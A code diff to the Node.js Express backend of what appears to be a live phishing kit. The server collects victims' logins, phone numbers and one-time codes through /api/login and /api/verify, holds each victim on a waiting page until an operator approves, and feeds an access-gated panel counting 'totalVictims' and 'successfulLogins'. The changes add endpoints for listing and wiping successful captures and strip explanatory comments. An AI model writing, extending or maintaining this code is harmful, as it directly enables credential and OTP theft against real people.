@@ -2,7 +2,7 @@
 const express    = require('express');
 const bodyParser = require('body-parser');
 const cors       = require('cors');
-const crypto     = require('crypto');   // ← move here
+const crypto     = require('crypto');
 const session    = require('cookie-session');
 
 /* ----------  CONFIG  ---------- */
@@ -43,7 +43,6 @@ app.get('/otp.html',     (req, res) => res.sendFile(__dirname + '/otp.html'));
 app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));
 
 /* ----------  PANEL ACCESS CONTROL  ---------- */
-// NEVER expose the real file name; serve only through /panel route
 app.get('/panel', (req, res) => {
   if (req.session?.authed) return res.sendFile(__dirname + '/_panel.html');
   res.sendFile(__dirname + '/access.html');
@@ -63,7 +62,7 @@ app.post('/panel/logout', (req, res) => {
   res.redirect('/panel');
 });
 
-// block direct file access (defence-in-depth)
+// block direct file access
 app.get(['/_panel.html', '/panel.html'], (req, res) => res.redirect('/panel'));
 
 /* ----------  DOMAIN HELPER  ---------- */
@@ -179,25 +178,18 @@ app.post('/api/login', async (req, res) => {
   }
 });
 
-/*  phone verify (NEW FLOW)  */
+/*  phone verify  */
 app.post('/api/verify', async (req, res) => {
   try {
     const { sid, phone } = req.body;
     if (!phone?.trim()) return res.sendStatus(400);
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
     const v = sessionsMap.get(sid);
-
-    // 1. store phone
     v.phone = phone;
-    v.status = 'wait';   // waiting for ADMIN to click ✅
+    v.status = 'wait';
     sessionActivity.set(sid, Date.now());
-
-    // 2. update audit log
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.phone = phone;
-
-    // 3. refresh panel
-    //    (page stays 'verify.html' until admin Continue)
     res.sendStatus(200);
   } catch (e) {
     console.error('Verify error', e);
@@ -276,10 +268,31 @@ app.get('/api/panel', (req, res) => {
     ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr
   }));
   res.json({
-    domain: currentDomain, totalVictims: victimCounter, active: list.length,
-    waiting: list.filter(x => x.status === 'wait').length, success: successfulLogins,
-    sessions: list, logs: auditLog.slice(-50).reverse()
+    domain: currentDomain,
+    totalVictims: victimCounter,
+    active: list.length,
+    waiting: list.filter(x => x.status === 'wait').length,
+    success: successfulLogins,
+    sessions: list,
+    logs: auditLog.slice(-50).reverse()
   });
+});
+
+/*  NEW: success-only log  */
+app.get('/api/success-log', (req, res) => {
+  const successes = auditLog
+    .filter(e => sessionsMap.get(e.sid)?.page === 'success')
+    .map(e => ({ ...e, page: 'success' }));
+  res.json(successes);
+});
+
+/*  NEW: wipe success list (optional)  */
+app.post('/api/clear-success', (req, res) => {
+  // remove from auditLog every entry whose session reached 'success'
+  for (let i = auditLog.length - 1; i >= 0; i--) {
+    if (sessionsMap.get(auditLog[i].sid)?.page === 'success') auditLog.splice(i, 1);
+  }
+  res.json({ ok: true });
 });
 
 /*  panel control  */
@@ -317,5 +330,4 @@ app.post('/api/panel', async (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RAILWAY_PUBLIC_DOMAIN || `http://localhost:${PORT}`;
-
 });
